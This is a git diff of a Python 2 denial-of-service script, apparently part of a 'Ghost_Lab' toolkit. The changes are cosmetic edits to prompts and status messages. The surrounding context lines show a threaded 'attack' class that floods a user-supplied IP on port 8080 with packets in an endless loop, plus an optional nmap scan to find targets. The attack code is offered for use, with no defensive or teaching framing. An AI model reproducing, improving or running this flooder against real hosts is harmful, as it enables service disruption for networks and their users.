@@ -79,13 +79,12 @@ class attack(threading.Thread):
         while True:
             s.sendto(bytes,(self.ip, self.port))
             print colors.vermelho + " [*] Pckt send:" + ":"+colors.verde + self.ip
-            print('')
       except KeyboardInterrupt:
         print('')
         print(colors.R+ "[!] Exiting...")
 try:
   print('')
-  Targets = raw_input("Do You See Possibles Targets ? Y / n > ")
+  Targets = raw_input("Do you see possibles targets ? n/Y > ")
   if Targets == 'Y' or Targets == 'y':
       print('')
       Animation(' Starting NMAP to SCAM...')
@@ -93,17 +92,17 @@ try:
   else:
       pass
   print('')    
-  ip = raw_input(colors.cyanClaro + "[*] Ip İnternal Network >> ")
+  ip = raw_input(colors.cyanClaro + "[*] Ip internal Network >> ")
   print('')
   pckt = raw_input(colors.amarelo + "[*] Packets Size >> ")
   print('')
   port = 8080
-  Animation(' Starting Atack Dooser IP Packets...')
+  Animation(' Starting Atack Dooser IP packets...')
   print('')
   print(Ghost_Lab.Status_Banner)
-  print(' IP : {}'.format(ip))
-  print(' Port : {}'.format(port))
-  print(' Dooser Packets : {}'.format(pckt))
+  print(' IP: {}'.format(ip))
+  print(' Port: {}'.format(port))
+  print(' Dooser Packets: {}'.format(pckt))
   print(Ghost_Lab.End_Status)
   time.sleep(2)
   print('')
